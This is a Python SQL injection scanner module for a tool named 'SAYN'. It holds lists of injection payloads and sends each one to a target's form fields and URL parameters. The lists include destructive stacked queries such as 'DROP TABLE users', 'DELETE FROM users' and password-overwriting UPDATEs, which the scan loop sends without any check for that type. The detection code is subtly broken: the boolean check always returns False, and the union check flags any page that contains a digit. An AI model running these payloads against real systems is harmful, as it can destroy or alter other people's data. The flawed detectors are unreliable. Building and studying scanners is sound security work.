"""
SQL Injection Scanner Module for SAYN
Detects SQL injection vulnerabilities
"""

import re
import asyncio
import time
from typing import Dict, List, Any, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import logging

class SQLIScanner:
    """Advanced SQL injection vulnerability scanner"""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.logger = logging.getLogger('SAYN.sqli_scanner')
        self.payloads = self._load_sqli_payloads()
        
    def _load_sqli_payloads(self) -> Dict[str, List[str]]:
        """Load SQL injection test payloads by type"""
        return {
            'error_based': [
                "' OR 1=1--",
                "' OR 1=1#",
                "' OR 1=1/*",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "') OR 1=1--",
                "') OR 1=1#",
                "admin'--",
                "admin'#",
                "admin'/*",
                "' OR '1'='1",
                "' OR '1'='1'--",
                "' OR '1'='1'#",
                "' OR '1'='1'/*",
            ],
            'boolean_based': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND 1=1#",
                "' AND 1=2#",
                "' AND 1=1/*",
                "' AND 1=2/*",
                "') AND 1=1--",
                "') AND 1=2--",
                "') AND 1=1#",
                "') AND 1=2#",
                "' AND (SELECT 1 FROM users LIMIT 1)--",
                "' AND (SELECT 1 FROM users LIMIT 1)#",
                "' AND (SELECT COUNT(*) FROM users)>0--",
                "' AND (SELECT COUNT(*) FROM users)>0#",
            ],
            'time_based': [
                "' AND (SELECT SLEEP(5))--",
                "' AND (SELECT SLEEP(5))#",
                "' AND (SELECT SLEEP(5))/*",
                "') AND (SELECT SLEEP(5))--",
                "') AND (SELECT SLEEP(5))#",
                "' AND (SELECT BENCHMARK(1000000,MD5(1)))--",
                "' AND (SELECT BENCHMARK(1000000,MD5(1)))#",
                "' WAITFOR DELAY '00:00:05'--",
                "' WAITFOR DELAY '00:00:05'#",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)#",
            ],
            'union_based': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT 1--",
                "' UNION SELECT 1,2--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT @@version--",
                "' UNION SELECT @@version,NULL--",
                "' UNION SELECT @@version,NULL,NULL--",
                "' UNION SELECT database()--",
                "' UNION SELECT database(),NULL--",
                "' UNION SELECT database(),NULL,NULL--",
                "' UNION SELECT user()--",
                "' UNION SELECT user(),NULL--",
                "' UNION SELECT user(),NULL,NULL--",
            ],
            'stacked_queries': [
                "'; DROP TABLE users--",
                "'; DROP TABLE users#",
                "'; DELETE FROM users--",
                "'; DELETE FROM users#",
                "'; UPDATE users SET password='hacked'--",
                "'; UPDATE users SET password='hacked'#",
                "'; INSERT INTO users VALUES (1,'hacker','hacked')--",
                "'; INSERT INTO users VALUES (1,'hacker','hacked')#",
            ]
        }
    
    async def scan(self, target: str, options: Dict[str, Any]) -> Dict[str, Any]:
        """Main SQL injection scanning method"""
        self.logger.info(f"Starting SQL injection scan for {target}")
        
        vulnerabilities = []
        scan_results = {
            'module': 'sqli_scanner',
            'target': target,
            'vulnerabilities': vulnerabilities,
            'scan_completed': False,
            'total_tests': 0,
            'tests_completed': 0
        }
        
        try:
            scanner_engine = options.get('scanner_engine')
            if not scanner_engine:
                raise ValueError("Scanner engine not provided in options")
            
            forms = await self._extract_forms(scanner_engine, target)
            parameters = await self._extract_parameters(scanner_engine, target)
            
            total_payloads = sum(len(payloads) for payloads in self.payloads.values())
            scan_results['total_tests'] = (len(forms) + len(parameters)) * total_payloads
            
            for form in forms:
                form_vulns = await self._test_form_sqli(scanner_engine, target, form)
                vulnerabilities.extend(form_vulns)
                scan_results['tests_completed'] += total_payloads
                
            for param in parameters:
                param_vulns = await self._test_parameter_sqli(scanner_engine, target, param)
                vulnerabilities.extend(param_vulns)
                scan_results['tests_completed'] += total_payloads
            
            scan_results['vulnerabilities'] = vulnerabilities
            scan_results['scan_completed'] = True
            
            self.logger.info(f"SQL injection scan completed. Found {len(vulnerabilities)} vulnerabilities")
            
        except Exception as e:
            self.logger.error(f"Error during SQL injection scan: {str(e)}")
            scan_results['error'] = str(e)
            
        return scan_results
    
    async def _extract_forms(self, scanner_engine, target: str) -> List[Dict[str, Any]]:
        """Extract forms from the target page"""
        forms = []
        
        try:
            response = await scanner_engine.make_request(target)
            if response.get('error'):
                return forms
                
            content = response.get('content', '')
            
            form_pattern = r'<form[^>]*>(.*?)</form>'
            form_matches = re.findall(form_pattern, content, re.IGNORECASE | re.DOTALL)
            
            for form_match in form_matches:
                form_info = {
                    'action': self._extract_form_action(form_match),
                    'method': self._extract_form_method(form_match),
                    'inputs': self._extract_form_inputs(form_match)
                }
                forms.append(form_info)
                
        except Exception as e:
            self.logger.error(f"Error extracting forms: {str(e)}")
            
        return forms
    
    def _extract_form_action(self, form_html: str) -> str:
        """Extract form action URL"""
        action_match = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
        return action_match.group(1) if action_match else ''
    
    def _extract_form_method(self, form_html: str) -> str:
        """Extract form method"""
        method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
        return method_match.group(1).upper() if method_match else 'GET'
    
    def _extract_form_inputs(self, form_html: str) -> List[Dict[str, str]]:
        """Extract form input fields"""
        inputs = []
        
        input_pattern = r'<input[^>]*>'
        input_matches = re.findall(input_pattern, form_html, re.IGNORECASE)
        
        for input_match in input_matches:
            input_info = {
                'name': self._extract_attribute(input_match, 'name'),
                'type': self._extract_attribute(input_match, 'type', 'text'),
                'value': self._extract_attribute(input_match, 'value', '')
            }
            if input_info['name']:
                inputs.append(input_info)
                
        textarea_pattern = r'<textarea[^>]*name=["\']([^"\']*)["\'][^>]*>'
        textarea_matches = re.findall(textarea_pattern, form_html, re.IGNORECASE)
        
        for name in textarea_matches:
            inputs.append({
                'name': name,
                'type': 'textarea',
                'value': ''
            })
            
        return inputs
    
    def _extract_attribute(self, html: str, attr: str, default: str = '') -> str:
        """Extract attribute value from HTML element"""
        pattern = rf'{attr}=["\']([^"\']*)["\']'
        match = re.search(pattern, html, re.IGNORECASE)
        return match.group(1) if match else default
    
    async def _extract_parameters(self, scanner_engine, target: str) -> List[str]:
        """Extract URL parameters for testing"""
        parameters = []
        
        try:
            parsed_url = urlparse(target)
            if parsed_url.query:
                params = parse_qs(parsed_url.query)
                parameters.extend(params.keys())
                
        except Exception as e:
            self.logger.error(f"Error extracting parameters: {str(e)}")
            
        return parameters
    
    async def _test_form_sqli(self, scanner_engine, target: str, form: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test form inputs for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        try:
            form_url = urljoin(target, form['action']) if form['action'] else target
            method = form['method']
            
            for input_field in form['inputs']:
                if input_field['type'] in ['text', 'textarea', 'search', 'url', 'tel']:
                    for sqli_type, payloads in self.payloads.items():
                        for payload in payloads:
                            vuln = await self._test_single_sqli(
                                scanner_engine, form_url, method, 
                                input_field['name'], payload, sqli_type, 'form_input'
                            )
                            if vuln:
                                vulnerabilities.append(vuln)
                                
        except Exception as e:
            self.logger.error(f"Error testing form SQL injection: {str(e)}")
            
        return vulnerabilities
    
    async def _test_parameter_sqli(self, scanner_engine, target: str, parameter: str) -> List[Dict[str, Any]]:
        """Test URL parameters for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        try:
            for sqli_type, payloads in self.payloads.items():
                for payload in payloads:
                    vuln = await self._test_single_sqli(
                        scanner_engine, target, 'GET', 
                        parameter, payload, sqli_type, 'url_parameter'
                    )
                    if vuln:
                        vulnerabilities.append(vuln)
                        
        except Exception as e:
            self.logger.error(f"Error testing parameter SQL injection: {str(e)}")
            
        return vulnerabilities
    
    async def _test_single_sqli(self, scanner_engine, url: str, method: str, 
                               param_name: str, payload: str, sqli_type: str, source: str) -> Optional[Dict[str, Any]]:
        """Test a single SQL injection payload"""
        try:
            if method == 'GET':
                parsed_url = urlparse(url)
                params = parse_qs(parsed_url.query)
                params[param_name] = [payload]
                
                new_query = urlencode(params, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                
                response = await scanner_engine.make_request(test_url)
            else:
                data = {param_name: payload}
                response = await scanner_engine.make_request(url, method='POST', data=data)
            
            if response.get('error'):
                return None
                
            content = response.get('content', '')
            status_code = response.get('status_code', 0)
            
            if sqli_type == 'error_based':
                if self._detect_sql_error(content):
                    return self._create_vulnerability(
                        'error_based_sql_injection', 'high', payload, param_name, 
                        source, url, content, sqli_type
                    )
            elif sqli_type == 'boolean_based':
                if self._detect_boolean_sqli(scanner_engine, url, method, param_name):
                    return self._create_vulnerability(
                        'boolean_based_sql_injection', 'high', payload, param_name, 
                        source, url, content, sqli_type
                    )
            elif sqli_type == 'time_based':
                if await self._detect_time_based_sqli(scanner_engine, url, method, param_name, payload):
                    return self._create_vulnerability(
                        'time_based_sql_injection', 'high', payload, param_name, 
                        source, url, content, sqli_type
                    )
            elif sqli_type == 'union_based':
                if self._detect_union_sqli(content):
                    return self._create_vulnerability(
                        'union_based_sql_injection', 'critical', payload, param_name, 
                        source, url, content, sqli_type
                    )
                    
        except Exception as e:
            self.logger.error(f"Error testing SQL injection payload: {str(e)}")
            
        return None
    
    def _detect_sql_error(self, content: str) -> bool:
        """Detect SQL error messages in response"""
        sql_error_patterns = [
            r'sql syntax.*mysql',
            r'warning.*mysql',
            r'mysql.*error',
            r'sql syntax.*mariadb',
            r'oracle.*error',
            r'oracle.*exception',
            r'microsoft.*database.*error',
            r'mssql.*error',
            r'postgresql.*error',
            r'sqlite.*error',
            r'sql.*syntax.*error',
            r'division by zero',
            r'supplied argument is not a valid mysql',
            r'mysql.*server.*error',
            r'ora-[0-9]+',
            r'microsoft ole db provider for sql server',
            r'postgresql.*query failed',
            r'sqlite.*syntax error',
            r'warning.*postgresql',
            r'postgresql.*warning',
            r'mysql.*warning',
            r'oracle.*warning',
            r'mssql.*warning',
            r'sqlite.*warning'
        ]
        
        for pattern in sql_error_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
                
        return False
    
    def _detect_boolean_sqli(self, scanner_engine, url: str, method: str, param_name: str) -> bool:
        """Detect boolean-based SQL injection"""
        return False
    
    async def _detect_time_based_sqli(self, scanner_engine, url: str, method: str, 
                                     param_name: str, payload: str) -> bool:
        """Detect time-based SQL injection"""
        try:
            start_time = time.time()
            
            if method == 'GET':
                parsed_url = urlparse(url)
                params = parse_qs(parsed_url.query)
                params[param_name] = [payload]
                
                new_query = urlencode(params, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                
                response = await scanner_engine.make_request(test_url)
            else:
                data = {param_name: payload}
                response = await scanner_engine.make_request(url, method='POST', data=data)
            
            response_time = time.time() - start_time
            
            if response_time > 5:
                return True
                
        except Exception as e:
            self.logger.error(f"Error in time-based SQL injection detection: {str(e)}")
            
        return False
    
    def _detect_union_sqli(self, content: str) -> bool:
        """Detect union-based SQL injection"""
        db_info_patterns = [
            r'[0-9]+\.?[0-9]*\.?[0-9]*\.?[0-9]*',  # Version numbers
            r'mysql.*[0-9]+\.[0-9]+\.[0-9]+',
            r'postgresql.*[0-9]+\.[0-9]+\.[0-9]+',
            r'oracle.*[0-9]+\.[0-9]+\.[0-9]+',
            r'mssql.*[0-9]+\.[0-9]+\.[0-9]+',
            r'sqlite.*[0-9]+\.[0-9]+\.[0-9]+'
        ]
        
        for pattern in db_info_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
                
        return False
    
    def _create_vulnerability(self, vuln_type: str, severity: str, payload: str, 
                             param_name: str, source: str, url: str, content: str, sqli_type: str) -> Dict[str, Any]:
        """Create vulnerability report"""
        return {
            'type': vuln_type,
            'severity': severity,
            'title': f'{sqli_type.replace("_", " ").title()} Vulnerability',
            'description': f'SQL injection vulnerability found in {source} "{param_name}". '
                         f'The payload "{payload}" triggered a {sqli_type} response.',
            'location': f'{url} (Parameter: {param_name})',
            'recommendation': 'Implement proper input validation and use parameterized queries. '
                            'Use an ORM or prepared statements to prevent SQL injection.',
            'payload': payload,
            'source': source,
            'parameter': param_name,
            'sqli_type': sqli_type,
            'evidence': content[:1000] + '...' if len(content) > 1000 else content
        }
